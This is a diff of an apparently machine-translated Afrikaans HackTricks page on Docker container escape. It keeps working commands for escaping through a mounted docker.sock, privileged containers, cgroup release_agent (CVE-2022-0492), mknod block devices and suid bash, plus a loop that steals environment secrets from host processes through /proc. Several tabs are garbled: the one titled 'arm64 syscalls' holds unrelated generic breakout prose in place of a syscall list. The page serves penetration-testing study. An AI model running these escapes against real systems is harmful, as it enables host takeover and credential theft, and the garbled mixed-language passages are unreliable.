@@ -2,19 +2,19 @@
 
 <details>
 
-<summary><strong>Leer AWS-hacking vanaf nul tot held met</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>
+<summary><strong>Leer AWS hak vanaf nul tot held met</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>
 
 Ander maniere om HackTricks te ondersteun:
 
-* As jy jou **maatskappy geadverteer wil sien in HackTricks** of **HackTricks in PDF wil aflaai** Kyk na die [**INSKRYWINGSPLANNE**](https://github.com/sponsors/carlospolop)!
+* As jy wil sien dat jou **maatskappy geadverteer word in HackTricks** of **HackTricks aflaai in PDF-formaat** Kyk na die [**INSKRYWINGSPLANNE**](https://github.com/sponsors/carlospolop)!
 * Kry die [**amptelike PEASS & HackTricks swag**](https://peass.creator-spring.com)
 * Ontdek [**Die PEASS Familie**](https://opensea.io/collection/the-peass-family), ons versameling eksklusiewe [**NFTs**](https://opensea.io/collection/the-peass-family)
-* **Sluit aan by die** 💬 [**Discord-groep**](https://discord.gg/hRep4RUj7f) of die [**telegram-groep**](https://t.me/peass) of **volg** ons op **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
-* **Deel jou haktruuks deur PRs in te dien by die** [**HackTricks**](https://github.com/carlospolop/hacktricks) en [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github-opslag.
+* **Sluit aan by die** 💬 [**Discord groep**](https://discord.gg/hRep4RUj7f) of die [**telegram groep**](https://t.me/peass) of **volg** ons op **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
+* **Deel jou haktruuks deur PRs in te dien by die** [**HackTricks**](https://github.com/carlospolop/hacktricks) en [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.
 
 </details>
 
-<figure><img src="../../../../.gitbook/assets/image (3) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../../.gitbook/assets/image (3) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
 \
 Gebruik [**Trickest**](https://trickest.com/?utm\_campaign=hacktrics\&utm\_medium=banner\&utm\_source=hacktricks) om maklik te bou en **werkstrome outomaties** te dryf met die wêreld se **mees gevorderde** gemeenskapshulpmiddels.\
@@ -25,15 +25,15 @@ Kry Vandag Toegang:
 ## Outomatiese Opsomming & Ontsnapping
 
 * [**linpeas**](https://github.com/carlospolop/PEASS-ng/tree/master/linPEAS): Dit kan ook **houers opsom**
-* [**CDK**](https://github.com/cdk-team/CDK#installationdelivery): Hierdie hulpmiddel is baie **nuttig om die houer waarin jy is te opsom en selfs probeer om outomaties te ontsnap**
-* [**amicontained**](https://github.com/genuinetools/amicontained): Nuttige hulpmiddel om die voorregte te kry wat die houer het om maniere te vind om daaruit te ontsnap
-* [**deepce**](https://github.com/stealthcopter/deepce): Hulpmiddel om houers te opsom en daaruit te ontsnap
+* [**CDK**](https://github.com/cdk-team/CDK#installationdelivery): Hierdie instrument is baie **nuttig om die houer waarin jy is te opsom en selfs probeer om outomaties te ontsnap**
+* [**amicontained**](https://github.com/genuinetools/amicontained): Nuttige instrument om die voorregte van die houer te kry om maniere te vind om daaruit te ontsnap
+* [**deepce**](https://github.com/stealthcopter/deepce): Instrument om houers te opsom en daaruit te ontsnap
 * [**grype**](https://github.com/anchore/grype): Kry die CVE's wat in die sagteware geïnstalleer in die beeld bevat word
 
 ## Gemonteerde Docker Sokkel Ontsnapping
 
-As jy op een of ander manier vind dat die **docker-sokkel binne die docker-houer gemonteer is**, sal jy daaruit kan ontsnap.\
-Dit gebeur gewoonlik in docker-houers wat om een ​​of ander rede moet koppel aan die docker-daemon om aksies uit te voer.
+As jy op een of ander manier vind dat die **docker sokkel binne die docker houer gemonteer is**, sal jy daaruit kan ontsnap.\
+Dit gebeur gewoonlik in docker-houers wat om een ​​of ander rede moet koppel aan die docker daemon om aksies uit te voer.
 ```bash
 #Search the socket
 find / -name docker.sock 2>/dev/null
@@ -54,10 +54,10 @@ nsenter --target 1 --mount --uts --ipc --net --pid -- bash
 docker run -it -v /:/host/ --cap-add=ALL --security-opt apparmor=unconfined --security-opt seccomp=unconfined --security-opt label:disable --pid=host --userns=host --uts=host --cgroupns=host ubuntu chroot /host/ bash
 ```
 {% hint style="info" %}
-In geval die **docker-socket op 'n onverwagte plek** is, kan jy steeds daarmee kommunikeer deur die **`docker`** bevel te gebruik met die parameter **`-H unix:///path/to/docker.sock`**
+In geval die **docker sokket op 'n onverwagte plek** is, kan jy steeds daarmee kommunikeer deur die **`docker`** bevel te gebruik met die parameter **`-H unix:///path/to/docker.sock`**
 {% endhint %}
 
-Docker daemon kan ook [luister op 'n poort (standaard 2375, 2376)](../../../../network-services-pentesting/2375-pentesting-docker.md) of op Systemd-gebaseerde stelsels, kan kommunikasie met die Docker daemon plaasvind oor die Systemd-socket `fd://`.
+Docker daemon kan ook [luister op 'n poort (standaard 2375, 2376)](../../../../network-services-pentesting/2375-pentesting-docker.md) of op Systemd-gebaseerde stelsels, kan kommunikasie met die Docker daemon plaasvind oor die Systemd sokket `fd://`.
 
 {% hint style="info" %}
 Daarbenewens, let op die uitvoeringsokkels van ander hoëvlak-uitvoeringsomgewings:
@@ -70,11 +70,11 @@ Daarbenewens, let op die uitvoeringsokkels van ander hoëvlak-uitvoeringsomgewin
 * ...
 {% endhint %}
 
-## Misbruik van Bevoegdhede Ontsnapping
+## Capabilities Misbruik Ontsnapping
 
-Jy moet die bevoegdhede van die houer nagaan, as dit enige van die volgende het, kan jy dalk daaruit ontsnap: **`CAP_SYS_ADMIN`**_,_ **`CAP_SYS_PTRACE`**, **`CAP_SYS_MODULE`**, **`DAC_READ_SEARCH`**, **`DAC_OVERRIDE, CAP_SYS_RAWIO`, `CAP_SYSLOG`, `CAP_NET_RAW`, `CAP_NET_ADMIN`**
+Jy moet die kapasiteite van die houer nagaan, as dit enige van die volgende het, kan jy dalk daaruit ontsnap: **`CAP_SYS_ADMIN`**_,_ **`CAP_SYS_PTRACE`**, **`CAP_SYS_MODULE`**, **`DAC_READ_SEARCH`**, **`DAC_OVERRIDE, CAP_SYS_RAWIO`, `CAP_SYSLOG`, `CAP_NET_RAW`, `CAP_NET_ADMIN`**
 
-Jy kan tans die houerbevoegdhede nagaan deur **voorheen genoemde outomatiese gereedskappe** te gebruik of:
+Jy kan tans die houerkapasiteite nagaan deur die **voorheen genoemde outomatiese gereedskap** of:
 ```bash
 capsh --print
 ```
@@ -84,7 +84,7 @@ Op die volgende bladsy kan jy **meer leer oor Linux-vermoëns** en hoe om dit te
 [linux-capabilities.md](../../linux-capabilities.md)
 {% endcontent-ref %}
 
-## Ontsnap uit Bevoorregte Containers
+## Ontsnapping uit Bevoorregte Houers
 
 'n Bevoorregte houer kan geskep word met die vlag `--privileged` of deur spesifieke verdedigings uit te skakel:
 
@@ -98,7 +98,7 @@ Op die volgende bladsy kan jy **meer leer oor Linux-vermoëns** en hoe om dit te
 * `--cgroupns=host`
 * `Mount /dev`
 
-Die `--privileged` vlag verlaag houer-sekuriteit aansienlik, deur **ongelimiteerde toegang tot toestelle** te bied en **veral beskermings te omseil**. Vir 'n gedetailleerde uiteensetting, verwys na die dokumentasie oor die volle impakte van `--privileged`.
+Die `--privileged` vlag verlaag houer-sekuriteit aansienlik, deur **onbeperkte toesteltoegang** te bied en **veral beskermings** te omseil. Vir 'n gedetailleerde uiteensetting, verwys na die dokumentasie oor die volle impakte van `--privileged`.
 
 {% content-ref url="../docker-privileged.md" %}
 [docker-privileged.md](../docker-privileged.md)
@@ -114,15 +114,15 @@ docker run --rm -it --pid=host --privileged ubuntu bash
 ```
 ### Bevoorreg
 
-Net met die bevoorregte vlag kan jy probeer om **toegang tot die gasheer se skyf** te kry of probeer **ontsnapping deur die release\_agent of ander ontvlugtings te misbruik**.
+Net met die bevoorregte vlag kan jy probeer om **toegang tot die gasheer se skyf** te kry of probeer **ontsnapping deur die release\_agent of ander ontvlugtings** te misbruik.
 
-Toets die volgende omseilings in 'n houer uitvoer:
+Toets die volgende omseilings in 'n houer deur uit te voer:
 ```bash
 docker run --rm -it --privileged ubuntu bash
 ```
 #### Monteer Disk - Poc1
 
-Goed geconfigureerde docker-houers sal nie opdragte soos **fdisk -l** toelaat nie. Tog, op 'n verkeerd gekonfigureerde docker-opdrag waar die vlag `--privileged` of `--device=/dev/sda1` met kapitalisering gespesifiseer is, is dit moontlik om die regte te kry om die gas-aandrywing te sien.
+Goed geconfigureerde docker-houers sal nie opdragte soos **fdisk -l** toelaat nie. Tog, op 'n verkeerd gekonfigureerde docker-opdrag waar die vlag `--privileged` of `--device=/dev/sda1` met kapitaliseer gespesifiseer is, is dit moontlik om die regte te kry om die gas-aandrywing te sien.
 
 ![](https://bestestredteam.com/content/images/2019/08/image-16.png)
 
@@ -135,7 +135,7 @@ En voilà! Jy kan nou toegang kry tot die lêersisteem van die gasheer omdat dit
 
 #### Montering van Skyf - Poc2
 
-Binne die houer kan 'n aanvaller probeer om verdere toegang tot die onderliggende gasheer-OS te verkry deur 'n skryfbare hostPath-volume wat deur die groep geskep is. Hieronder is 'n paar algemene dinge wat jy binne die houer kan nagaan om te sien of jy hierdie aanvallervektor kan benut:
+Binne die houer kan 'n aanvaller probeer om verdere toegang tot die onderliggende gasheer-bedryfstelsel te verkry deur 'n skryfbare hostPath-volume wat deur die groep geskep is. Hieronder is 'n paar algemene dinge wat jy binne die houer kan nagaan om te sien of jy hierdie aanvallervektor kan benut:
 ```bash
 ### Check if You Can Write to a File-system
 echo 1 > /proc/sysrq-trigger
@@ -192,7 +192,9 @@ sh -c "echo 0 > $d/w/cgroup.procs"; sleep 1
 # Reads the output
 cat /o
 ```
-#### Bevoorregte Ontsnapping deur die skepping van release\_agent ([cve-2022-0492](https://unit42.paloaltonetworks.com/cve-2022-0492-cgroups/)) - PoC2
+#### Bevoorregte ontsnapping deur die skepping van release\_agent ([cve-2022-0492](https://unit42.paloaltonetworks.com/cve-2022-0492-cgroups/)) te misbruik - PoC2
+
+{% code title="Tweede PoC" %}
 ```bash
 # On the host
 docker run --rm -it --cap-add=SYS_ADMIN --security-opt apparmor=unconfined ubuntu bash
@@ -338,8 +340,8 @@ root        10     2  0 11:25 ?        00:00:00 [ksoftirqd/0]
 ```
 #### Bevoorregte Ontsnapping deur Misbruik van Sensitiewe Monterings
 
-Daar is verskeie lêers wat gemonteer kan word wat **inligting oor die onderliggende gasheer** gee. Sommige van hulle kan selfs aandui **iets wat deur die gasheer uitgevoer moet word wanneer iets gebeur** (wat 'n aanvaller in staat sal stel om uit die houer te ontsnap).\
-Die misbruik van hierdie lêers kan dit moontlik maak dat:
+Daar is verskeie lêers wat gemonteer kan word wat **inligting oor die onderliggende gasheer** gee. Sommige van hulle kan selfs **aandui dat iets deur die gasheer uitgevoer moet word wanneer iets gebeur** (wat 'n aanvaller in staat sal stel om uit die houer te ontsnap).\
+Die misbruik van hierdie lêers mag toelaat dat:
 
 * release\_agent (reeds voorheen gedek)
 * [binfmt\_misc](sensitive-mounts.md#proc-sys-fs-binfmt\_misc)
@@ -355,14 +357,14 @@ Jy kan egter **ander sensitiewe lêers** vind om vir te kyk op hierdie bladsy:
 
 ### Willekeurige Monterings
 
-In verskeie gevalle sal jy vind dat die **houer 'n volume van die gasheer gemonteer het**. As hierdie volume nie korrek geconfigureer is nie, kan jy moontlik **toegang verkry/wysig tot sensitiewe data**: Lees geheime, verander ssh authorized\_keys...
+In verskeie gevalle sal jy vind dat die **houer 'n volume van die gasheer gemonteer het**. As hierdie volume nie korrek geconfigureer is nie, kan jy moontlik **toegang verkry/wysig aan sensitiewe data**: Lees geheime, verander ssh authorized\_keys...
 ```bash
 docker run --rm -it -v /:/host ubuntu bash
 ```
 ### Voorregverhoging met 2 doppe en gasheerberg
 
-Indien jy toegang het as **root binne 'n houer** wat 'n paar vouers van die gasheerberg gemonteer het en jy het **ontvlug as 'n nie-bevoorregte gebruiker na die gasheer** en het leestoegang oor die gemonteerde vouer.\
-Jy kan 'n **bash suid-lêer** skep in die **gemonteerde vouer** binne die **houer** en dit **uitvoer vanaf die gasheer** vir voorregverhoging.
+Indien jy toegang het as **root binne 'n houer** wat 'n paar vouers van die gasheerberg gemonteer het en jy het as 'n nie-bevoorregte gebruiker na die gasheer ontsnap en het leestoegang oor die gemonteerde vouer.\
+Jy kan 'n **bash suid-lêer** skep in die **gemonteerde vouer** binne die **houer** en dit vanaf die gasheer **uitvoer** vir voorregverhoging.
 ```bash
 cp /bin/bash . #From non priv inside mounted folder
 # You need to copy it from the host as the bash binaries might be diferent in the host and in the container
@@ -370,12 +372,12 @@ chown root:root bash #From container as root inside mounted folder
 chmod 4777 bash #From container as root inside mounted folder
 bash -p #From non priv inside mounted folder
 ```
-### Voorregskaping met 2 doppe
+### Voorregverhoging met 2 doppe
 
-Indien jy toegang het as **root binne 'n houer** en jy het **ontsnap as 'n nie-bevoorregte gebruiker na die gasheer**, kan jy beide doppe misbruik om **voorregskaping binne die gasheer** te bewerkstellig as jy die vermoë MKNOD binne die houer het (dit is standaard) soos [**verduidelik in hierdie pos**](https://labs.withsecure.com/blog/abusing-the-access-to-mount-namespaces-through-procpidroot/).\
-Met so 'n vermoë word die root-gebruiker binne die houer toegelaat om **bloktoestel lêers te skep**. Toestel lêers is spesiale lêers wat gebruik word om **onderliggende hardeware & kernel modules te benader**. Byvoorbeeld, die /dev/sda bloktoestel lêer gee toegang om **die rou data op die stelsel se skyf te lees**.
+As jy toegang het as **root binne 'n houer** en jy het **ontsnap as 'n nie-bevoorregte gebruiker na die gasheer**, kan jy beide doppe misbruik om **voorregte binne die gasheer te verhoog** as jy die vermoë MKNOD binne die houer het (dit is standaard) soos [**verduidelik in hierdie plasing**](https://labs.withsecure.com/blog/abusing-the-access-to-mount-namespaces-through-procpidroot/).\
+Met so 'n vermoë word die root-gebruiker binne die houer toegelaat om **bloktoestel-lêers te skep**. Toestellêers is spesiale lêers wat gebruik word om **onderliggende hardeware en kernelmodules te benader**. Byvoorbeeld, die /dev/sda bloktoestel-lêer gee toegang om **die rou data op die stelsel se skyf te lees**.
 
-Docker beskerm teen misbruik van bloktoestelle binne houers deur 'n cgroup beleid af te dwing wat **bloktoestel lees/skryf operasies blokkeer**. Nietemin, as 'n bloktoestel binne die houer **geskep word**, word dit toeganklik van buite die houer via die **/proc/PID/root/** gids. Hierdie toegang vereis dat die **proses eienaar dieselfde is** binne en buite die houer.
+Docker beskerm teen misbruik van bloktoestelle binne houers deur 'n cgroup-beleid af te dwing wat **bloktoestel lees-/skryfhandelinge blokkeer**. Nietemin, as 'n bloktoestel binne die houer **geskep word**, word dit toeganklik van buite die houer via die **/proc/PID/root/**-gids. Hierdie toegang vereis dat die **proses-eienaar dieselfde is** binne en buite die houer.
 
 **Uitbuiting** voorbeeld van hierdie [**verslag**](https://radboudinstituteof.pwning.nl/posts/htbunictfquals2021/goodgames/):
 ```bash
@@ -419,9 +421,9 @@ As jy toegang het tot die prosesse van die gasheer, sal jy in staat wees om baie
 ```
 docker run --rm -it --pid=host ubuntu bash
 ```
-Byvoorbeeld, sal jy in staat wees om die prosesse te lys wat iets soos `ps auxn` gebruik en te soek na sensitiewe besonderhede in die opdragte.
+Byvoorbeeld, jy sal in staat wees om die prosesse te lys deur iets soos `ps auxn` te gebruik en te soek na sensitiewe besonderhede in die opdragte.
 
-Dan, aangesien jy **toegang tot elke proses van die gasheer in /proc/ kan kry, kan jy net hul omgewingsgeheime steel** deur uit te voer:
+Dan, aangesien jy **toegang tot elke proses van die gasheer in /proc/ kan kry, kan jy net hul omgewingsgeheime steel** deur:
 ```bash
 for e in `ls /proc/*/environ`; do echo; echo $e; xargs -0 -L1 -a $e; done
 /proc/988058/environ
@@ -450,16 +452,16 @@ As jy op een of ander manier bevoorregte **toegang oor 'n proses buite die houer
 ```
 docker run --rm -it --network=host ubuntu bash
 ```
-Indien 'n houer ingestel is met die Docker [gasnetwerkbestuurder (`--network=host`)](https://docs.docker.com/network/host/), is daardie houer se netwerkstapel nie geïsoleer van die Docker-gashouer nie (die houer deel die gasheer se netwerk-namespace), en die houer kry nie sy eie IP-adres toegewys nie. Met ander woorde, **bind die houer alle dienste direk aan die gasheer se IP**. Verder kan die houer **ALLE netwerkverkeer wat die gasheer** stuur en ontvang op die gedeelde koppelvlak onderskep `tcpdump -i eth0`.
+Indien 'n houer ingestel is met die Docker [gasnetwerkbestuurder (`--network=host`)](https://docs.docker.com/network/host/), is daardie houer se netwerkstapel nie geïsoleer van die Docker-gashouer nie (die houer deel die gas se netwerk-namespace), en die houer kry nie sy eie IP-adres toegewys nie. Met ander woorde, die **houer bind alle dienste direk aan die gas se IP**. Verder kan die houer **ALLE netwerkverkeer wat die gas** stuur en ontvang op die gedeelde koppelvlak onderskep `tcpdump -i eth0`.
 
-Byvoorbeeld, jy kan dit gebruik om **verkeer te snuif en selfs te vervals** tussen die gasheer en metadata-instansie.
+Byvoorbeeld, jy kan dit gebruik om **verkeer te snuif en selfs te vervals** tussen die gas en metadata-instansie.
 
 Soos in die volgende voorbeelde:
 
-* [Verslag: Hoe om Google SRE te kontak: 'n Skul in die wolk SQL laat val](https://offensi.com/2020/08/18/how-to-contact-google-sre-dropping-a-shell-in-cloud-sql/)
+* [Verslag: Hoe om Google SRE te kontak: 'n Skulping in die wolk SQL](https://offensi.com/2020/08/18/how-to-contact-google-sre-dropping-a-shell-in-cloud-sql/)
 * [Metadata-diens MITM maak wortelprivilege-escalatie moontlik (EKS / GKE)](https://blog.champtar.fr/Metadata\_MITM\_root\_EKS\_GKE/)
 
-Jy sal ook in staat wees om **netwerkdienste wat aan localhost gebind is** binne die gasheer te benader of selfs die **metadata-toestemmings van die node** te benader (wat dalk verskillend is van dié wat 'n houer kan benader).
+Jy sal ook in staat wees om **netwerkdienste wat aan localhost gebind is** binne die gas te bereik of selfs toegang te verkry tot die **metadata-toestemmings van die node** (wat dalk verskil van dié wat 'n houer kan bereik).
 
 ### hostIPC
 ```bash
@@ -472,20 +474,20 @@ Met `hostIPC=true`, verkry jy toegang tot die interproses kommunikasie (IPC) bro
 
 ### Herstel vaardighede
 
-As die systaalaanroep **`unshare`** nie verbied is nie, kan jy al die vaardighede herstel deur uit te voer:
+As die systaalaanroep **`unshare`** nie verbied is nie, kan jy al die vaardighede herwin deur uit te voer:
 ```bash
 unshare -UrmCpf bash
 # Check them with
 cat /proc/self/status | grep CapEff
 ```
-### Gebruikersnaamruimte misbruik via symboliese koppeling
+### Gebruikersnaamruimte misbruik via symboliese skakel
 
-Die tweede tegniek wat verduidelik word in die pos [https://labs.withsecure.com/blog/abusing-the-access-to-mount-namespaces-through-procpidroot/](https://labs.withsecure.com/blog/abusing-the-access-to-mount-namespaces-through-procpidroot/) dui aan hoe jy bindkoppeling met gebruikersnaamruimtes kan misbruik om lêers binne die gasheer te beïnvloed (in daardie spesifieke geval, lêers te verwyder).
+Die tweede tegniek wat verduidelik word in die pos [https://labs.withsecure.com/blog/abusing-the-access-to-mount-namespaces-through-procpidroot/](https://labs.withsecure.com/blog/abusing-the-access-to-mount-namespaces-through-procpidroot/) dui aan hoe jy bind mounts met gebruikersnaamruimtes kan misbruik om lêers binne die gasheer te beïnvloed (in daardie spesifieke geval, lêers te verwyder).
 
-<figure><img src="../../../../.gitbook/assets/image (3) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../../.gitbook/assets/image (3) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
-Gebruik [**Trickest**](https://trickest.com/?utm\_campaign=hacktrics\&utm\_medium=banner\&utm\_source=hacktricks) om maklik **werkvloeie te bou** en te **outomatiseer** wat aangedryf word deur die wêreld se **mees gevorderde** gemeenskapshulpmiddels.\
-Kry Vandag Toegang:
+Gebruik [**Trickest**](https://trickest.com/?utm\_campaign=hacktrics\&utm\_medium=banner\&utm\_source=hacktricks) om maklik te bou en **werkstrome outomaties** te dryf met die wêreld se **mees gevorderde** gemeenskapshulpmiddels.\
+Kry Toegang Vandag:
 
 {% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}
 
@@ -493,27 +495,27 @@ Kry Vandag Toegang:
 
 ### Runc uitbuiting (CVE-2019-5736)
 
-In die geval dat jy `docker exec` as root kan uitvoer (waarskynlik met sudo), kan jy probeer om voorregte te eskaleer deur te ontsnap uit 'n houer wat misbruik maak van CVE-2019-5736 (uitbuiting [hier](https://github.com/Frichetten/CVE-2019-5736-PoC/blob/master/main.go)). Hierdie tegniek sal basies die _**/bin/sh**_ binêre lêer van die **gasheer** **oorvryf vanuit 'n houer**, sodat enigeen wat `docker exec` uitvoer die lading kan aktiveer.
+In die geval dat jy `docker exec` as root kan uitvoer (waarskynlik met sudo), kan jy probeer om voorregte te eskaleer deur te ontsnap uit 'n houer wat misbruik maak van CVE-2019-5736 (uitbuiting [hier](https://github.com/Frichetten/CVE-2019-5736-PoC/blob/master/main.go)). Hierdie tegniek sal basies die _**/bin/sh**_ binêre lêer van die **gasheer** **oorvryf vanuit 'n houer**, sodat enigeen wat docker exec uitvoer die lading kan aktiveer.
 
 Verander die lading dienooreenkomstig en bou die main.go met `go build main.go`. Die resulterende binêre lêer moet in die docker-houer geplaas word vir uitvoering.\
 Met uitvoering, sodra dit `[+] Oorvryf /bin/sh suksesvol` vertoon, moet jy die volgende vanaf die gasheer-rekenaar uitvoer:
 
 `docker exec -it <houer-naam> /bin/sh`
 
-Dit sal die lading aktiveer wat teenwoordig is in die main.go-lêer.
+Dit sal die lading aktiveer wat teenwoordig is in die main.go lêer.
 
 Vir meer inligting: [https://blog.dragonsector.pl/2019/02/cve-2019-5736-escape-from-docker-and.html](https://blog.dragonsector.pl/2019/02/cve-2019-5736-escape-from-docker-and.html)
 
 {% hint style="info" %}
-Daar is ander CVE's waaraan die houer kwesbaar kan wees, jy kan 'n lys vind in [https://0xn3va.gitbook.io/cheat-sheets/container/escaping/cve-list](https://0xn3va.gitbook.io/cheat-sheets/container/escaping/cve-list)
+Daar is ander CVE's waar die houer vatbaar vir kan wees, jy kan 'n lys vind in [https://0xn3va.gitbook.io/cheat-sheets/container/escaping/cve-list](https://0xn3va.gitbook.io/cheat-sheets/container/escaping/cve-list)
 {% endhint %}
 
 ## Docker Aangepaste Ontsnapping
 
 ### Docker Ontsnappingsoppervlak
 
-* **Naamruimtes:** Die proses moet **heeltemal geskei wees van ander prosesse** via naamruimtes, sodat ons nie kan ontsnap om met ander prosesse te kommunikeer as gevolg van naamruimtes (standaard kan nie kommunikeer via IPC's, Unix-sockets, netwerkdienste, D-Bus, `/proc` van ander prosesse).
-* **Root-gebruiker**: Standaard is die gebruiker wat die proses uitvoer die root-gebruiker (tans is sy voorregte beperk).
+* **Naamruimtes:** Die proses moet **heeltemal geskei wees van ander prosesse** via naamruimtes, sodat ons nie kan ontsnap om met ander prosesse te interaksieer as gevolg van naamruimtes (standaard kan nie kommunikeer via IPC's, Unix-sockets, netwerkdienste, D-Bus, `/proc` van ander prosesse).
+* **Root-gebruiker**: Standaard is die gebruiker wat die proses hardloop die root-gebruiker (tans is sy voorregte beperk).
 * **Vermoeëns**: Docker laat die volgende vermoëns oor: `cap_chown,cap_dac_override,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_net_bind_service,cap_net_raw,cap_sys_chroot,cap_mknod,cap_audit_write,cap_setfcap=ep`
 * **Syscalls**: Dit is die syscalls wat die **root-gebruiker nie sal kan aanroep nie** (wegens gebrek aan vermoëns + Seccomp). Die ander syscalls kan gebruik word om te probeer ontsnap.
 
@@ -541,33 +543,34 @@ Daar is ander CVE's waaraan die houer kwesbaar kan wees, jy kan 'n lys vind in [
 ```
 {% endtab %}
 
-{% tab title="arm64 syscalls" %}  
+{% tab title="arm64 syscalls" %} 
+
 ### Docker Breakout Privilege Escalation
 
 #### Description
 
-Docker breakout is a privilege escalation technique that allows an attacker to break out of a Docker container and gain access to the underlying host system. This can lead to full compromise of the host and potentially the entire network.
+Docker breakout is a privilege escalation technique that allows an attacker to break out of a Docker container and gain access to the host operating system. This can lead to full control of the host system, posing a significant security risk.
 
 #### Attack Scenario
 
-1. **Identify Docker Environment**: The attacker first needs to identify that the target system is running Docker.
+1. **Identify Docker Container**: The attacker first needs to gain access to a Docker container running on the target system.
 
-2. **Exploit Vulnerabilities**: The attacker exploits vulnerabilities within the Docker container to gain access to the host system.
+2. **Exploit Vulnerabilities**: The attacker then exploits vulnerabilities within the Docker container to execute malicious code and gain access to the host system.
 
-3. **Privilege Escalation**: Once inside the host system, the attacker escalates privileges to gain root access.
+3. **Privilege Escalation**: By breaking out of the Docker container, the attacker can escalate their privileges and potentially take control of the host operating system.
 
 #### Mitigation
 
-- Regularly update Docker and the underlying host system to patch known vulnerabilities.
-- Implement least privilege principles to restrict container capabilities.
-- Monitor Docker logs and system logs for any suspicious activities.
-- Use security tools like AppArmor and SELinux to enforce security policies.
-- Consider using Docker Bench Security to check for common best practices.
+To prevent Docker breakout privilege escalation, follow these best practices:
 
-#### References
+- **Update Docker**: Regularly update Docker to patch known vulnerabilities and improve security.
+- **Use Appropriate Permissions**: Limit the permissions granted to Docker containers to reduce the impact of a breakout.
+- **Monitor Container Activity**: Monitor Docker container activity for any suspicious behavior that could indicate a breakout attempt.
+- **Implement Network Segmentation**: Use network segmentation to isolate Docker containers from critical systems and data.
+- **Enable Docker Security Features**: Enable Docker security features such as seccomp, AppArmor, and SELinux to enhance container security.
 
-- [Docker Security](https://docs.docker.com/engine/security/security/)
-- [Docker Bench Security](https://github.com/docker/docker-bench-security)  
+By following these mitigation strategies, you can reduce the risk of Docker breakout privilege escalation and enhance the security of your Docker environment.
+
 {% endtab %}
 ```
 0x029 -- pivot_root
@@ -588,11 +591,10 @@ Docker breakout is a privilege escalation technique that allows an attacker to b
 ```
 {% endtab %}
 
-{% tab title="syscall_bf.c" %}  
-### Docker Breakout Privilege Escalation
+{% tab title="syscall_bf.c" %} 
+## Docker Breakout Privilege Escalation
 
-Hierdie tegniek maak gebruik van 'n spesifieke kwesbaarheid in Docker wat toelaat dat 'n aanvaller van binne 'n Docker-houer kan ontsnap en beheer oor die gasheerstelsel kan verkry. Die aanvaller kan die `CAP_SYS_ADMIN`-bevoegdheid verkry deur 'n spesifieke reeks van stelseloproepers te maak. Hierdie aanval vereis egter dat die aanvaller reeds toegang tot die Docker-houer het.  
-{% endtab %}
+Hierdie tegniek demonstreer hoe 'n aanvaller vanuit 'n Docker-houer kan ontsnap en bevoorregting kan verhoog deur die gebruik van 'n spesifieke kwesbare Docker-houer. Die aanvaller kan die `CAP_SYS_ADMIN` bevoorregting verkry deur 'n spesiale reeks van `syscall` oproepe te maak. Hierdie aanval vereis dat die aanvaller reeds toegang tot 'n kwesbare Docker-houer het.
 ````c
 // From a conversation I had with @arget131
 // Fir bfing syscalss in x64
@@ -656,7 +658,7 @@ If you are in **userspace** (**no kernel exploit** involved) the way to find new
 * [https://0xn3va.gitbook.io/cheat-sheets/container/escaping/exposed-docker-socket](https://0xn3va.gitbook.io/cheat-sheets/container/escaping/exposed-docker-socket)
 * [https://bishopfox.com/blog/kubernetes-pod-privilege-escalation#Pod4](https://bishopfox.com/blog/kubernetes-pod-privilege-escalation#Pod4)
 
-<figure><img src="../../../../.gitbook/assets/image (3) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../../.gitbook/assets/image (3) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
 Use [**Trickest**](https://trickest.com/?utm\_campaign=hacktrics\&utm\_medium=banner\&utm\_source=hacktricks) to easily build and **automate workflows** powered by the world's **most advanced** community tools.\
 Get Access Today:
